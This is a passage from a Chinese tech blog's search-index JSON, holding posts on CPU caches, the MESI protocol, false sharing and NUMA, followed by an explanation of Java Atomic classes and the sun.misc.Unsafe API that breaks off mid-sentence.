GET_VEDIO_INFO_PRE这个地址是YouTube的公共API，目前还是可以使用的，可以检索一些视频的信息。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"深入浅析内存","slug":"深入浅析内存","date":"2019-12-27T16:00:00.000Z","updated":"2020-10-25T08:29:30.000Z","comments":true,"path":"深入浅析内存/","link":"","permalink":"https://gschaos.club/%E6%B7%B1%E5%85%A5%E6%B5%85%E6%9E%90%E5%86%85%E5%AD%98/","excerpt":"最近在看一本&lt;&lt;架构解密：从分布式到微服务&gt;&gt;中看到了有关内存的相关知识，自己这方面比较薄弱，就想着记录下来。书本地址：www.zhihu.com/pub/book/119572875","text":"最近在看一本&lt;&lt;架构解密：从分布式到微服务&gt;&gt;中看到了有关内存的相关知识，自己这方面比较薄弱，就想着记录下来。书本地址：www.zhihu.com/pub/book/119572875 除了CPU，内存大概是最重要的计算资源了。基本称为分布式系统标配的缓存中间件、高性能的数据处理系统及当前流行的大数据平台，都离不开对计算机内存的深入理解与巧妙使用。 你所不知道的内存知识复杂的CPU与单纯的内存首先，我们澄清几个容易让人混淆的CPU术语。 Socket或者Processor：指一个屋里CPU芯片，盒装的或者散装的，上面有很多针脚，直接安装在主板上。 Core：指Socket里封装的一个CPU核心，每个Core都是完全独立的计算单元，我们平时说的4核CPU，就是指一个Socket(Processor)里封装了4个Core。 HT超线程：目前Intel与AMD的Processor大多支持在一个Core里并行执行两个线程，此时在操作系统看来就相当于两个逻辑CPU(Logical Processor),在大多数情况下，我们在程序里提到CPU这个概念时，就是指一个Logical Processor。 &nbsp; &nbsp; 然后，我们先从第一个非常简单的问题开始：CPU可以直接操作内存吗？可能99%的程序员会不假思索的回答：「肯定的，不然程序怎么跑。」如果理性地分析一下，你会发现这个回答有问题：CPU与内存条是独立的两个硬件，而且CPU上也没有插槽和连线可以让内存条挂上去，也就是说，CPU并不能直接访问内存条，而是要通过主办上的其他硬件(接口)来间接访问内存条。 &nbsp; &nbsp;第二个问题：CPU的运算速度与内存条的访问速度在回见的差距究竟有多大？这个差距跟王健林「先挣它个一个亿的」小目标和「普通人有车有房」的宏大目标之间的差距相比，是更大还是更小呢？答案是：「差不多」。通常来说，CPU的运算速度与内存访问速度之间的差距不过是100倍，假如有100万RMB就可以有有房(贷)有车(贷)了没那么其100倍就刚好是一亿RMB。 &nbsp; &nbsp;既然CPU的速度与内存的速度还是存在高度两个数量级的巨大鸿沟，所有它们注定不能「幸福地在一起」，于是CPU的亲密伴侣Cache闪亮登场。与来自DRAM家族的内存(Memory)出身不同，Cache来自ASRAM家族。DRAM与SRAM最简单的区别是后者特别快，容量特别小，电路结构非常复杂，造假特别高。 &nbsp; &nbsp;造成Cache与内存之间巨大性能差距的主要原因是工作原理和结构不同，如下所述。 DRAM存储一个数据只需要一个电容加一个晶体管，SRAM则需要6个晶体管。由于DRAM的数据其实是保存在电容里的，所以每次读写过程中的充放电环节也导致了DRAM读写数据有一个延迟的问题，这个延迟通常为十几到几十ns。 内存可以看做一个二维数据，每个存储单元都有其行地址和列地址。由于SRAM的容量很小，所以存储单元的地址(行与列)比较短，可以一次性传输到SRAM中；而DRAM则需要分别传送行与列的地址。 SRAM的频率基本与CPU的频率保持一致；而DRAM的频率知道DDR4以后才开始接近CPU的频率。 &nbsp; &nbsp;Cache是被集成到CPU内部的一个存储单元，一级Cache(L1 Cache)通常只有32~64KB的容量，这个容量远远不能满足CPU大量、告诉存取的需求。此外，由于存储性能的答复提升往往伴随着价格的同步飙升，所以出于对整体成本的控制，现实中往往采用金字塔形的多级Cache体系来实现最佳缓存效果，于是出现了二级Cache(L2 Cache)及三级Cache(L3 Cache)，每一级Cache都牺牲了部分性能指标来换取更大的容量，目的是缓存更多的热点数据。以Intel家族 Intel Sandy Bridge架构的CPU为例，其L1 Cache容量为64KB，访问速度为1ns左右；L2 Cache容量扩大4倍，达到256KB，访问速度则降低到3ns左右；L3 Cache的容量则扩大512倍，达到32MB，访问速度也下降到12ns左右，即使如此，也比访问驻村的100ns(40ns+65ns)快一个数量级。此外，L3 Cache是被一个Socket上的所有CPU Core共享的，其实最早的L3 Cache被应用在AMD发布的K6-III处理器上，当时的L3 Cache受限于制造工艺，并没有被集成到CPU内部，而是集成到主板上。 &nbsp; &nbsp;从Intel Sandy Bridge CPU架构图中可以看出，CPU如果要访问内存中的数据，则要经过L1、L2、L3这三道关卡后才能抵达目的地，这个过程并不是「皇上」(CPU)亲自出马，而是交由3个级别的贵妃(Cache)们层层转发「圣旨」(内部指令)，最红抵达「后宫」(内存). 多核CPU与内存共享的问题&nbsp; &nbsp;在多核CPU的情况下，如何共享内存？ &nbsp; &nbsp;如果擅长多线程高级编程，那么肯定会毫不犹豫地给出以下伪代码： 123synchronized(memory)&#123; doSomething(...);&#125; &nbsp; &nbsp;如果真这个简单，那么这个世界上就不会只剩下两家独大的主流CPU制造商了，而且可怜的AMD一直被Intel「吊打」。 &nbsp; &nbsp;多核CPU共享内存的问题也被称为Cache一致性问题，简单地说，就是多个CPU核心所看到的Cache数据应该是一直的，在某个数据被某个CPU写入自己的Cache(L1 Cache)以后，其他CPU都应该能看到相同的Cache数据；如果自己的Cache中有旧数据，则抛弃旧数据。考虑到每个CPU有自己内存独占的Cache，所以这个问题与分布式Cache保持同步的问题是同一类问题。来自Intel的MESI协议是目前业界公认的Cache一致性问题的最佳方案，大多数SMP架构都采用这一方案，虽然该协议是一个CPU内部的协议，但由于它对我们理解内存模型及解决分布式系统的数据一致性问题有重要的参考价值，所以在这对其进行简单介绍。 &nbsp; &nbsp;Cache Line，如果有印象的话，则你会发现I/O操作从来不以字节为单位，而是以「块」为单位，这里有两个原因：首先，因为I/O操作比较慢，所以读一个字节与一个读连续N个字节所花费的时间基本相同；其次，数据访问往往具有空间连续性地特征，即我们通常会访问空间上连续的一些数据。举个例子，访问数组时通常会循环遍历，比如查找某个值或者进行比较等，如果把数组中连续的几个字节都读到内存中，那么CPU的处理速度会提升几倍。对于CPU来说，由于Memory也是慢速的外部组件，所以针对Memory的读写也采用类似I/O块的方式就不足为奇了。实际上，CPU Cache里的最小存储单元就是Cache Line，Intel CPU的一个Cache Line存储64个字节，每一级Cache都被划分为很多组Cache Line，典型的情况是4条Cache Line为一组，当Cache从Memory中加载数据时，一次加载一条Cache Line的数据。下图是Cache的结构。 &nbsp; &nbsp;每个Cache Line的头部有两个Bit来表示自身的状态，总共4种状态。 M（Modified）：修改状态，其他CPU上没有数据的副本，并且在本CPU上被修改过，与存储器中的数据不一致，最终必然会引发系统总线的写指令，将Cache Line的数据写回到Memory中。 E(Exclusive)：独占状态，表示当前Cache Line中包含的数据与Memory中的数据一致，此外，其他CPU中没有数据的副本。 S（Shared）：共享状态，表示Cache Line中包含的数据与Memory中的数据一致，而且在当前CPU和至少在其他某个CPU中有副本。 I(Invalid)：无效状态，当前Cache Line中没有有效数据或该Cache Line的数据已经失效，不能再用，当Cache要加载新数据时，优先选择此状态的Cache Line，此外，Cache Line的初始状态也是I状态。 &nbsp; &nbsp;MESI协议是用Cache Line的上述4种状态命名的，对Cache的读写操作引发了Cache Line的状态变化，因而可以理解为一种状态机模型。但MESI的复杂和独特之处在于状态的两种视角：一种是当前读写操作(Local Read/Write)所在CPU看到的自身的Cache Line状态及其他CPU上对应的Cache Line状态；另一种是一个CPU上的Cache Line状态的变迁会导致其他CPU上对应的Cache Line的状态变迁。如下所示为MESI协议的状态图。 &nbsp; &nbsp;结合状态图，我们深入分析MESI协议的一些实现细节。 &nbsp; &nbsp;（1）某个CPU(CPU A)发起本地读请求(Local Read)，比如读取某个内存地址的变量，如果此时所有的CPU的Cache中都没有加载此内存地址，即此内存地址对应的Cache Line为无效状态(Invalid)，则CPU A中的Cache会发起一个到Memory的内存Load指令，在相应的Cache Line中完成内存加载后，此Cache Line的状态会被标记位Exclusive。接下来，如果其他CPU(CPU B)在总线上也发起对同一个内存地址的读请求，则这个读请求会被CPU A 嗅探到(SNOOP),然后CPU A在内存总线上复制一份Cache Line作为应答，并将自身的Cache Line状态改为Shared，同时CPU B收到来自总线的应答并保存到自己的Cache里，也修改对应的Cache Line 状态为Shared。 &nbsp; &nbsp;(2)某个CPU(CPU A)发起本地写请求(Loacl Write),比如对某个内存地址的变量赋值，如果此时多有的CPU的Cache中都没加载此内存地址，即此内存对应的Cache Line为无效状态(Invalid)，则CPU A 中的Cache Line保存了最新的内存变量值后，其祖航太修改为Modified。随后，如果CPU B发起对同一个变量的读操作(Remote Read)，则CPU A在总线嗅探到这个读请求以后，先将Cache Line里修改过的数据回写(Write Back)到Memory中，然后在内存总线上复制一份Cache Line作为应答，最后将自身的Cache Line状态修改为Shared，由此产生的结果是CPU A与CPU B里对应的Cache Line状态都为Shared。 &nbsp; &nbsp;(3)以上面第二条内容为基础，CPU A发起本地写请求并导致自身的Cache Line状态变为Modified，如果此时CPU B 发起同一个内存地址的写请求(Remote Write)，则我们看到的状态图里此时CPU A 的Cache Line状态为Invalid 其原因如下。 &nbsp; &nbsp;CPU B此时发出的是一个特殊的请求——读并且打算修改数据，当CPU A从总线上嗅探到这个请求后，会先阻止此请求并取得总线的控制权( Takes Control of Bus)，随后将Cache Line里修改过的数据回写到Memory中，再将此Cache Line的状态修改为Invalid(这是因为其他CPU要改数据，所以没必要改为Shared)。与此同时，CPU B 发现之前的请求并没有得到响应，于是重新发起一次请求，此时由于所有的CPU的Cache里都没有内存副本了，所以CPU B的Cache就从Memory中加载最新的数据到Cache Line中，随后修改数据，然后改变Cache Line的状态为Modified。 &nbsp; &nbsp;(4)如果内存中的某个变量被多个CPU加载到各自的Cache中，从而使得变量对应的Cache Line状态为Shared，若此时某个CPU打算对此变量进行写操作，则会导致所有拥有此变量缓存的CPU的Cache Line状态都变为Invalid，这是引发性能下降的一个典型Cache Miss 问题。 &nbsp; &nbsp;在理解了MESI协议以后，我们明白了一个重要的事实，即存在多个处理器时，对共享变量的修改操作会设计多个CPU之间协调问题及Cache失效问题，这就引发了著名的「Cache伪共享」问题。 &nbsp; &nbsp;如果要访问的数据不在CPU的运算单元里，则需要从缓存中加载，如果缓存中恰好有此数据而且数据有效，就命中一次(Cache Hit)，反之产生一次Cache Miss ，此时需要从下一级缓存或主存中再次尝试加载。根据之前的分析，如果发生了Cache Miss，则数据的访问性能瞬间下降很多！在我们需要大量加载运算的情况下，数据结构、访问方式及程序运算方面是否符合「缓存友好」的设计，就成为「量变引起质变」得关键性因素了。这也是为什么最近，国外很多大数据领域的专家都热衷于研究设计和采用新一代的数据结构和算法，而其核心之一就是「缓存友好」。 著名的Cache伪共享问题&nbsp; &nbsp;Cache伪共享问题是编程中真实存在的一个问题，考虑如下所示的Java Class结构： 12345class MyObject&#123; private long a; private long b; private long c;&#125; &nbsp; &nbsp; 按照java规范,MyObject的对象是在堆内存上分配空间存储的，而且a、b、c三个属性在内存空间上是邻近，如下所示。 a(8个字节) b（8个字节） c(8个字节) &nbsp; &nbsp;我们知道，X86的CPU中Cache Line的长度为64字节，这也就意味着MyObject的3个属性(长度之和为24字节)是完全可能加载在一个Cache Line里的。如此一来，如果我们有两个不同的线程(分别运行在两个CPU上)分别同时独立修改a与b这两个属性，那么这两个CPU上的Cache Line可能出现如下所示的情况，即a与b这两个变量被放入同一个Cache Line里，并且被两个不同的CPU共享。 &nbsp; &nbsp;根据上节中MESI协议的相关知识，我们知道，如果Thread 0要对a变量进行修改，则因为CPU 1 上有对应的Cache Line ， 这会导致CPU 1 的Cache Line 无效，从而使得Thread 1 被迫重新从Memory里获取b的内容(b并没有被其他CPU改变，这样做是因为b与a在一个Cache Line里)。同样，如果Thread 1 要对b变量进行修改，则同样导致Thread 0 的Cache Line 失效，不得不重新从Memory里加载a。如此一来，本来是逻辑上无关的两个线程，完全可以在两个不同的CPU上同时执行，但阴差阳错地共享了同一个Cache Line 并相互抢占资源，导致并形成为串行，大大降低了系统的并发性，这就是所谓的Cache伪共享。 &nbsp; &nbsp;解决Cache伪共享问题的方法很简单，将a与b两个变量分到不同的Cache Line里，通常可以用一些无用的字段填充a与b之间的空隙。由于伪共享问题对性能的影响比较大，所以JDK 8 首次提供了正式的普适性的方案，即采用@Contended注解来确保一个Object或者Class里的某个属性与其他属性不在一个Cache Line里，下面的VolatileLong的多个实例之间就不会产生Cache伪共享的问题： 1234@Contendedclass VolatileLong&#123; public volatile long value = 0L;&#125; 深入理解不一致性内存&nbsp; &nbsp;MESI协议解决了多核CPU下的Cache一致性问题，因而成为SMP架构的唯一选择。SMP架构近几年迅速在PC领域(X86)发展，一个CPU芯片上集成的CPU核心数量越来越多，到2017年，AMD的ZEN系列处理器就已经达到16核心32线程了。SMP架构是一种平行的结果，所有CPU Core都连接到一个内存总线上，他们平等访问内存，同时整个内存是统一结构、统一寻址的(Uniform Memory Architecture , UMA)。如下所示给出了SMP架构的示意图。 &nbsp; &nbsp;但是，随着CPU核心数量的不断增长，SMP架构也暴露其天生的短板，其根本瓶颈是共享内存总线的宽带无法满足CPU数量的增加，同时，一条「马路」上同行的「车」多了，难免陷入「拥堵模式」。在这种情况下，分布式解决方案应运而生，系统的内存与CPU进行分割并绑定在一起，形成多个独立的子系统，这些子系统之间高速互连，这就是所谓的NUMA（None Uniform Memory Architecture）架构，如下图所示： &nbsp; &nbsp;我们可以认为NUMA架构第1次打破了「大锅饭」的模式，内存不在是一个整体，而是被分割为互相独立的几块，被不同的CPU私有化(Attach到不同的CPU上)。因此，当CPU访问自身私有的内存地址时（Local Access），会很快得到响应，而如果需要访问其他CPU控制的内存数据（Remote Access），则需要通过某种互连通道（Inter-connect通道）访问，响应时间与之前相对变慢。NUMA的主要优点是伸缩性，NUMA的这种体系结构在设计上已经超越了SMP，可以扩展到几百个CPU而不会导致性能的严重下降。 &nbsp; &nbsp;NUMA技术最早出现出现在20世纪80年代，主要运行在一些大中型UNIX系统中，Sequent公司是世界公认的NUMA技术领袖。早在1986年，Sequent公司就率先利用微处理器构建大型系统，开发了基于UNIX的SMP体系结构，开创了业界转入SMP领域的先河。1999年9月，IBM公司收购了Sequent公司，将NUMA技术集成到IBM UNIX阵营中，并推出了能够支持和扩展Intel平台的NUMA-Q系统及方案，为全球大型企业客户适应高速发展的电子商务市场提供了更加多样化、高可扩展性及易于管理的选择，成为NUMA技术的领先开发者与革新者。随后很多老牌UNIX服务器厂商也采用了NUMA技术，例如IBM、Sun、惠普、Unisys、SGI等公司。2000年全球互联网泡沫破灭后，X86+Linux系统开始以低廉的成本侵占UNIX的底盘，AMD率先在其AMD Opteron 系列处理器中的X86 CPU上实现了NUMA架构，Intel也跟进并在Intel Nehalem中实现了NUMA架构（Intel服务器芯片志强E5500以上的CPU和桌面的i3、i5、i7均采用此架构），至此NUMA这个贵族技术开始真正走入平常百姓家。 &nbsp; &nbsp;下面详细分析一下NUMA技术的特点。首先，NUMA架构中引入了一个重要的新名词——Node，一个Node由一个或者多个Socket组成，即物理上的一个或多个CPU芯片组成一个逻辑上的Node。如下所示为来自Dell PowerEdge系统服务器的说明手册中的NUMA的图片，4个Intel Xeon E 5-4600处理器形成4个独立的NUMA Node，由于每个Intel Xeon E 5-4600为8Core，支持双线程，所以每个Node里的Logic CPU数量为16个，占每个Node分配系统总内存1/4，每个Node之间通过Intel QPI（QuickPath Interconnect）技术形成了点到点的全互连处理器系统。 &nbsp; &nbsp;其次，我们看到NUMA这种基于点到点的全互连处理器系统与传统的基于共享总线的处理器系统的SMP还是有巨大差异的。在这种情况下无法通过嗅探总线的方式来实现Cache一致性，因此为了实现NUMA架构下的Cache一致性，Intel引入了MESI协议的一个扩展写协议——MESIF。MESIF采用了一种基于目录表的实现方案，该协议由Boxboro-EX处理器系统实现，但独立研究MESIF协议并没有太大的意义，因为目前Intel并没有公开Boxbore-EX处理器系统的详细设计文档。 &nbsp; &nbsp;最后，我们说说NUMA架构的当前困境与我们对未来的展望。 &nbsp; &nbsp;NUMA架构由于打破了传统的「全局内存」概念，目前在编程语言方面还没有任何一种语言从内存模型上支持它，所以当前很难开发适应NUMA的软件。但这方面已经有很多尝试和进展了。Java在支持NUMA的系统里，可以开启基于NUMA的内存分配方案，使得当前线程所需要的内存从对应的Node上分配，从而大大加快对象的创建过程。在大数据领域，NUMA系统正在发挥着越来越强的作用，SAP的高端大数据系统HANA被SGI在其UV NUMA Systems上实现了良好的水平扩展。据说微软将会把SQL Server引入到Linux上，如此一来，很多潜在客户将有机会在SGI提供的大型NUMA机器上高速运行多个SQL Server实例。在云计算与虚拟化方面。OpenStack与VMware已经支持基于NUMA技术的虚机分配能力，使得不同的虚机运行在不同的Core上，同时虚机的内存不会跨越多个NUMA Node。 &nbsp; &nbsp;NUMA技术也会推进基于多进程的高性能单机分布式系统的发展，即在4个Socket、每个Socket为16Core的强大机器里，只要启动4个进程，通过NUMA技术将每个进程绑定到一个Socket上，并保证每个进程只访问不超过Node本地的内存，即可让系统进行最高性能的并发，而进程间的通信通过高性能进程间的通信技术实现即可。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"内存","slug":"内存","permalink":"https://gschaos.club/tags/%E5%86%85%E5%AD%98/"}]},{"title":"并发编程之Atomic&Unsafe魔法类详解","slug":"UNSAFE和Java-内存布局","date":"2019-12-11T16:00:00.000Z","updated":"2020-10-25T08:28:20.000Z","comments":true,"path":"UNSAFE和Java-内存布局/","link":"","permalink":"https://gschaos.club/UNSAFE%E5%92%8CJava-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/","excerpt":"并发编程之Atomic&amp;Unsafe魔法类详解","text":"并发编程之Atomic&amp;Unsafe魔法类详解 并发编程之Atomic&amp;Unsafe魔法类详解并发编程之Atomic&amp;Unsafe魔法类详解一、什么是原子操作？原子（atom）本意是“不能被进一步分割的最小粒子”，而原子操作（atomic operation）意为”不可被中断的一个或一系列操作”。在多处理器上实现原子操作就变得有点复杂。本文让我们一起来聊一聊在Inter处理器和Java里是如何实现原子操作的。 1、相关术语 术语名称 英文 缓存行 Cache line 比较并交换 Compare and Swap CPU流水线 CPU pipeline 内存顺序冲突 Memory order violation 二、CPU原子操作的实现方式32位IA-32处理器使用基于对缓存加锁或总线加锁的方式来实现多处理器之间的原子操作。 1、处理器自动保证基本内存操作的原子性 首先处理器会自动保证基本的内存操作的原子性。处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字 节的内存地址。奔腾6和最新的处理器能自动保证单处理器对同一个缓存行里进行16/32/64位的操作是原子的，但是复杂的内存操作处理器不能自动保证其原子性，比如跨总线宽度， 跨多个缓存行，跨页表的访问。但是处理器提供总线锁定和缓存锁定两个机制来保证复杂内存操作的原子性。 2、使用总线锁保证原子性 第一个机制是通过总线锁保证原子性。如果多个处理器同时对共享变量进行读改写（i++就是经典的读改写操作）操作，那么共享变量就会被多个处理器同时进行操作，这样读改写操作就不是原子的，操作完之后共享变量的值会和期望的不一致，举个例子：如果i=1,我们进行两次i++操作，我们期望的结果是3，但是有可能结果是2。 如下图 原因是有可能多个处理器同时从各自的缓存中读取变量i，分别进行加一操作，然后分别写入系统内存当中。那么想要保证读改写共享变量的操作是原子的，就必须保证CPU1读 改写共享变量的时候，CPU2不能操作缓存了该共享变量内存地址的缓存。 处理器使用总线锁就是来解决这个问题的。所谓总线锁就是使用处理器提供的一个LOCK＃信号，当一个处理器在总线上输出此信号时，其他处理器的请求将被阻塞住,那么该 处理器可以独占使用共享内存。 3、使用缓存锁保证原子性 第二个机制是通过缓存锁定保证原子性。在同一时刻我们只需保证对某个内存地址的操作是原子性即可，但总线锁定把CPU和内存之间通信锁住了，这使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定的开销比较大，最近的处理器在某些场合下使用缓存锁定代替总线锁定来进行优化。 频繁使用的内存会缓存在处理器的L1，L2和L3高速缓存里，那么原子操作就可以直接在处理器内部缓存中进行，并不需要声明总线锁，在奔腾6和最近的处理器中可以使用“缓存锁定”的方式来实现复杂的原子性。所谓“缓存锁定”就是如果缓存在处理器缓存行中内存区域在LOCK操作期间被锁定，当它执行锁操作回写内存时，处理器不在总线上声言LOCK＃信号，而是修改内部的内存地址，并允许它的缓存一致性机制来保证操作的原子性，因为缓存一致性机制会阻止同时修改被两个以上处理器缓存的内存区域数据，当其他处理器回写已被锁定的缓存行的数据时会起缓存行无效，在例1中，当CPU1修改缓存行中的i时使用缓存锁定，那么CPU2就不能同时缓存了i的缓存行。 但是有两种情况下处理器不会使用缓存锁定。第一种情况是：当操作的数据不能被缓存在处理器内部，或操作的数据跨多个缓存行（cache line），则处理器会调用总线锁定。第二种情况是：有些处理器不支持缓存锁定。对于Inter486和奔腾处理器,就算锁定的内存区域在处理器的缓存行中也会调用总线锁定。 以上两个机制我们可以通过Inter处理器提供了很多LOCK前缀的指令来实现。比如位测试和修改指令BTS，BTR，BTC，交换指令XADD，CMPXCHG和其他一些操作数和逻辑指令，比如ADD（加），OR（或）等，被这些指令操作的内存区域就会加锁，导致其他处理器不能同时访问它。 4、Java当中如何实现原子操作 在java中可以通过锁和循环CAS的方式来实现原子操作。 JVM中的CAS操作正是利用了上文中提到的处理器提供的CMPXCHG指令实现的。自旋CAS实现的基本思路就是循环进行CAS操作直到成功为止，具体的类可以参见juc下的atomic包内的原子类。 三、Atomic在Atomic包里一共有12个类，四种原子更新方式，分别是原子更新基本类型，原子更新数组，原子更新引用和原子更新字段。Atomic包里的类基本都是使用Unsafe实现的包装类。 基本类：AtomicInteger、AtomicLong、AtomicBoolean； 引用类型：AtomicReference、AtomicReference的ABA实例、AtomicStampedRerence、AtomicMarkableReference； 数组类型：AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray； 属性原子修改器（Updater）：AtomicIntegerFieldUpdater、AtomicLongFieldUpdater、AtomicReferenceFieldUpdater； 1、原子更新基本类型类 用于通过原子的方式更新基本类型，Atomic包提供了以下三个类： AtomicBoolean：原子更新布尔类型。 AtomicInteger：原子更新整型。 AtomicLong：原子更新长整型。 AtomicInteger的常用方法如下： int addAndGet(int delta)：以原子方式将输入的数值与实例中的值（AtomicInteger里的value）相加，并返回结果 boolean compareAndSet(int expect,int update)：如果输入的数值等于预期值，则以原子方式将该值设置为输入的值。 int getAndIncrement()：以原子方式将当前值加1，注意：这里返回的是自增前的值。 void lazySet(int newValue)：最终会设置成newValue，使用lazySet设置值后，可能导致其他线程在之后的一小段时间内还是可以读到旧的值。 int getAndSet(int newValue)：以原子方式设置为newValue的值，并返回旧值。 Atomic包提供了三种基本类型的原子更新，但是Java的基本类型里还有char，float和double等。那么问题来了，如何原子的更新其他的基本类型呢？Atomic包里的类基本都是 使用Unsafe实现的，Unsafe只提供了三种CAS方法，compareAndSwapObject，compareAndSwapInt和compareAndSwapLong，再看AtomicBoolean源码，发现其是 先把Boolean转换成整型，再使用compareAndSwapInt进行CAS，所以原子更新double也可以用类似的思路来实现。 2、原子更新数组类 通过原子的方式更新数组里的某个元素，Atomic包提供了以下三个类： AtomicIntegerArray：原子更新整型数组里的元素。 AtomicLongArray：原子更新长整型数组里的元素。 AtomicReferenceArray：原子更新引用类型数组里的元素。 AtomicIntegerArray类主要是提供原子的方式更新数组里的整型， 其常用方法如下 int addAndGet(int i, int delta)：以原子方式将输入值与数组中索引i的元素相加。 boolean compareAndSet(int i, int expect, int update)：如果当前值等于预期值，则以原子方式将数组位置i的元素设置成update值。 3、原子更新引用类型 原子更新基本类型的AtomicInteger，只能更新一个变量，如果要原子的更新多个变量，就需要使用这个原子更新引用类型提供的类。Atomic包提供了以下三个类： AtomicReference：原子更新引用类型。 AtomicReferenceFieldUpdater：原子更新引用类型里的字段。 AtomicMarkableReference：原子更新带有标记位的引用类型。可以原子的更新一个布尔类型的标记位和引用类型。构造方法是AtomicMarkableReference(V initialRef, boolean initialMark) 4、原子更新字段类 如果我们只需要某个类里的某个字段，那么就需要使用原子更新字段类，Atomic包提供了以下三个类： AtomicIntegerFieldUpdater：原子更新整型的字段的更新器。 AtomicLongFieldUpdater：原子更新长整型字段的更新器。 AtomicStampedReference：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于原子的更数据和数据的版本号，可以解决使用CAS进行原子更新时，可能出现的ABA问题。原子更新字段类都是抽象类，每次使用都时候必须使用静态方法newUpdater创建一个更新器。原子更新类的字段的必须使用public volatile修饰符。 四、Unsafe魔法类Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。在程序中过度、不正确使用Unsafe类会使得程序出错的概率变大，使得Java这种安全的语言变得不再“安全”，因此对Unsafe的使用一定要慎重。 Unsafe类为一单例实现，提供静态方法getUnsafe获取Unsafe实例，当且仅当调用getUnsafe方法的类为引导类加载器所加载时才合法，否则抛出SecurityException异常。 123456789101112131415161718复制public class Unsafe &#123; &#x2F;&#x2F; 单例对象 private static final Unsafe theUnsafe; private Unsafe() &#123; &#125; @CallerSensitive public static Unsafe getUnsafe() &#123; Class var0 &#x3D; Reflection.getCallerClass(); &#x2F;&#x2F;仅在引导类加载器&#96;BootstrapClassLoader&#96;加载时才合法 if (!VM.isSystemDomainLoader(var0.getClassLoader())) &#123; throw new SecurityException(&quot;Unsafe&quot;); &#125; else &#123; return theUnsafe; &#125; &#125;&#125; 1、如何获取Unsafe实例？ 1、从getUnsafe方法的使用限制条件出发，通过Java命令行命令-Xbootclasspath/a把调用Unsafe相关方法的类A所在jar包路径追加到默认的bootstrap路径中，使得A被 引导类加载器加载，从而通过Unsafe.getUnsafe方法安全的获取Unsafe实例。 java ­Xbootclasspath/a:${path} // 其中path为调用Unsafe相关方法的类所在jar包路径 2、通过反射获取单例对象theUnsafe。 123456789101112复制public class UnsafeInstance &#123; public static Unsafe reflectGetUnsafe() &#123; try &#123; Field field &#x3D; Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;); field.setAccessible(true); return (Unsafe) field.get(null); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 2、Unsafe功能介绍 Unsafe提供的API大致可分为内存操作、CAS、Class相关、对象操作、线程调度、系统信息获取、内存屏障、数组操作等几类，下面将对其相关方法和应用场景进行详细介绍。 1、内存操作 这部分主要包含堆外内存的分配、拷贝、释放、给定地址值操作等方法。 1234567891011121314151617复制&#x2F;&#x2F;分配内存, 相当于C++的malloc函数 public native long allocateMemory(long bytes); &#x2F;&#x2F;扩充内存 public native long reallocateMemory(long address, long bytes); &#x2F;&#x2F;释放内存 public native void freeMemory(long address);&#x2F;&#x2F;在给定的内存块中设置值 public native void setMemory(Object o, long offset, long bytes, byte value); &#x2F;&#x2F;内存拷贝 public native void copyMemory(Object srcBase, long srcOffset, Object destBase, long destOffset, long bytes); &#x2F;&#x2F;获取给定地址值，忽略修饰限定符的访问限制。与此类似操作还有: getInt， getDouble，getLong，getChar等 public native Object getObject(Object o, long offset); &#x2F;&#x2F;为给定地址设置值，忽略修饰限定符的访问限制，与此类似操作还有: putInt,putDouble，putLong，putChar等 public native void putObject(Object o, long offset, Object x); public native byte getByte(long address); &#x2F;&#x2F;为给定地址设置byte类型的值（当且仅当该内存地址为 allocateMemory分配 时，此方法结果才是确定的） public native void putByte(long address, byte x); 通常，我们在Java中创建的对象都处于堆内内存（heap）中，堆内内存是由JVM所管控的Java进程内存，并且它们遵循JVM的内存管理机制，JVM会采用垃圾回收机制统一管理堆内存。与之相对的是堆外内存，存在于JVM管控之外的内存区域，Java中对堆外内存的操作，依赖于Unsafe提供的操作堆外内存的native方法。 使用堆外内存的原因 ①对垃圾回收停顿的改善。由于堆外内存是直接受操作系统管理而不是JVM，所以当我们使用堆外内存时，即可保持较小的堆内内存规模。从而在GC时减少回收停顿对于应用的影响。 ②提升程序I/O操作的性能。通常在I/O通信过程中，会存在堆内内存到堆外内存的数据拷贝操作，对于需要频繁进行内存间数据拷贝且生命周期较短的暂存数据，都建议存储到堆外内存。 典型应用 DirectByteBuffer是Java用于实现堆外内存的一个重要类，通常用在通信过程中做缓冲池，如在Netty、MINA等NIO框架中应用广泛。DirectByteBuffer对于堆外内存的创建、使用、销毁等逻辑均由Unsafe提供的堆外内存API来实现。 下图为DirectByteBuffer构造函数，创建DirectByteBuffer的时候，通过Unsafe.allocateMemory分配内存、Unsafe.setMemory进行内存初始化，而后构建Cleaner对象用于跟踪DirectByteBuffer对象的垃圾回收，以实现当DirectByteBuffer被垃圾回收时，分配的堆外内存一起被释放。 2、CAS相关 如下源代码释义所示，这部分主要为CAS相关操作的方法。 1234567891011复制&#x2F;*** CAS* @param o 包含要修改field的对象 * @param offset 对象中某field的偏移量 * @param expected 期望值 * @param update 更新值 * @return true | false *&#x2F;public final native boolean compareAndSwapObject(Object var1,long var2,Object var4,Object var5);public final native boolean compareAndSwapInt(Object var1,long var2,int var4,int var5);public final native boolean compareAndSwapLong(Object var1,long var2,long var4,long var6); 典型应用 如下图所示，AtomicInteger的实现中，静态字段valueOffset即为字段value的内存偏移地址，valueOffset的值在AtomicInteger初始化时，在静态代码块中通过Unsafe的objectFieldOffset方法获取。在AtomicInteger中提供的线程安全方法中，通过字段valueOffset的值可以定位到AtomicInteger对象中value的内存地址，从而可以根据CAS实现对value字段的原子操作。 下图为某个AtomicInteger对象自增操作前后的内存示意图，对象的基地址 